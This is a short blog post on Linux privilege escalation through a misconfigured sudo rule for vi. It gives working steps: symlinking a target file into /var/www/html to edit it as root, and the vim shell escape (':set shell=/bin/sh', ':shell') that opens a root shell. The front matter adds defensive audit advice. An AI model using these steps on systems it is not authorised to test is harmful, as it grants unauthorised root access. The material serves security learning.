---
layout: post
title: Sometimes escalating privileges is that easy
image: /images/2019/priv-escalation.jpg   # full-bleed hero, 16:7
image_alt: "Linux kernel privilege escalation flow showing SUID binaries, misconfigured sudoers, and path hijacking"
takeaways:
  - "Privilege escalation is often a chain of seemingly trivial configuration oversights."
  - "Audit SUID binaries, wildcards in cron jobs, and permissive sudo rules rigorously."
  - "Least-privilege execution on the host neutralizes post-exploitation pivots."
date: 2019-11-29
categories: ["privilege escalation", "Linux security", "sudo", "SUID", "offensive security", "post-exploitation"]
excerpt: Quick techniques for host privilege escalation using misconfigured sudo permissions, symlinks, and editor shell escapes.
---
<img loading="lazy" src="/images/61231935_457720931698319_1779304573052125184_n.jpg" alt="Screengrab of a privilege escalation exploit using symlinks and sudo vi" width="773" height="113">

symlink to the file you want to CRUD with root privileges. then sudo vi
/var/www/html/<insert symlink name.

Or once inside vim

`:set shell=/bin/sh`

`:shell`